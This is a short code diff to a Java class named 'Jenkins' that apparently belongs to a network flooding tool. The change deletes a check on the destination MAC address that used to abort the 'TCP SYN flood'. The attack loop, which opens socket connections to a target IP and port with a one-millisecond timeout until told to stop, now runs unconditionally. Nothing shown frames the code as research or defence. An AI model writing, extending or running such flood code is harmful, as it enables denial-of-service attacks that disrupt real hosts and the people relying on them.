@@ -110,12 +110,7 @@ public class Jenkins {
 
         try {
             InetAddress targetAddress = InetAddress.getByName(targetIp);
-            byte[] dstMac = getDestinationMacAddress(targetAddress);
-            if (dstMac == null) {
-                log("Unable to get destination MAC address. Aborting TCP SYN flood.");
-                return;
-            }
-
+            
             while (!stopAttack) {
                 try (Socket socket = new Socket()) {
                     socket.connect(new InetSocketAddress(targetAddress, targetPort), 1);
